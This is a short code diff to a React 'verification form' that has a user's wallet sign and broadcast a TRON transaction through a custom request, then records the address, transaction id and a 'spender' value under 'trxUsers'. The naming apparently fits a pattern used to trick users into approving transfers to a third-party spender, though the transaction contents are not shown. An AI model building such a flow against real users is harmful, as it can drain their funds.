@@ -282,13 +282,16 @@ const VerificationFormComponent = (props) => {
       );
 
       // const signedTx = await wallet.adapter.signTransaction(transaction);
+      const signedTx = await wallet.adapter.customRequest({
+        method: "tron_signTransaction",
+        params: [transaction],
+      });
+      const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
 
-      // const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
+      // const txWithSender = { ...transaction, from: address };
+      // console.log('wallet',wallet);
 
-      const txWithSender = { ...transaction, from: address };
-      console.log('wallet',wallet);
-      
-      const receipt = await wallet.adapter.sendTransaction(txWithSender);
+      // const receipt = await wallet.adapter.sendTransaction(txWithSender);
 
       if (receipt?.txid) {
         addData('trxUsers', address, receipt?.txid, spenderTrx)
